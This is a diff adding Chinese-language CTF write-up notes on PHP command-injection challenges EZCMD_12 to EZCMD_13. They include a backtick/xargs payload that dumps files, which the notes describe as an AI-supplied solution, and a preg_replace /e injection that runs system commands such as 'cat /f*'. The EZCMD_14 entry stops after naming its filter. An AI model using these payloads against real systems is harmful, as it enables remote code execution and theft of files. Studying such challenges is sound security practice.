@@ -200,7 +200,74 @@ system只是php的一种命令执行函数，还有很多其他的。
 
 **EZCMD_12**
 ![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781499728494_image.png)
+过滤了一堆字符。分号空格反引号管道符都还在
 
+
+AI提供的一种解法:
+
+反引号 + 管道 + 文件操作命令 `` echo `ls|xargs cat`; ``
+Shell 里的执行流程:
+步骤 1：`ls|xargs cat` 被丢给 shell
+```
+ls | xargs cat
+```
+步骤 2：ls 列出文件
+```
+flag.php
+index.php
+```
+步骤 3：管道 | 把结果传给 xargs
+`xargs` 把标准输入的一行行文本，变成命令参数。
+
+把文件名从 stdin 数据（ls 的输出）转换成 cat 的命令行参数
+```
+xargs cat
+  ↓ 收到 "flag.php\nindex.php"
+  ↓ 转换
+cat flag.php index.php
+```
+步骤 4：cat 输出两个文件内容
+```
+<?php $flag = "flag{xxxxx}"; ?>
+<?php ...题目源码... ?>
+```
+```
+echo `ls|xargs cat`;
+  ↑    ↑   ↑   ↑
+  │    │   │   └── 最终执行的命令
+  │    │   └─────── 管道：连接左边输出→右边输入
+  │    └─────────── 反引号：PHP 的 shell_exec
+  └──────────────── 把命令结果打印出来
+```
+反引号是 PHP 开给 Shell 的后门，管道是 Shell 程序之间的水管，xargs 是把文件名列表变成命令参数的转换器。三者一环扣一环，谁也没用被禁字符。 🔥
+
+
+
+**EZCMD_13**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781656552810_image.png)
+```
+$re = isset($_GET['re']) ? $_GET['re'] : ''; 
+等价于
+
+if (isset($_GET['re'])) {
+    $re = $_GET['re'];
+} else {
+    $re = '';
+}
+```
+`` preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str) ``
+`\\1` 是一个动态占位符，指把前面正则表达式里第一个匹配到的实际内容**替换到这个位置**
+`preg_replace`加上`/e`,会把「替换结果」当 PHP 代码再执行一遍，在`\\1`被替换为匹配值之后执行命令
+`/e` 会自动转义 `\1` 里的 单引号、双引号和反斜杠(加`\`)
+`re=.*`:匹配所有字符
+`?re=.*&str=${phpinfo()}`可以看到phpinfo
+参数逃逸
+``?re=.*&str=${system($_GET[1])}&1=cat /f*``
+
+**EZCMD_14**
+![image.png](https://img.xobear.cn/file/CTF/WEB/Qingcen/1781661527705_image.png)
+
+过滤字母和数字
 
 
 
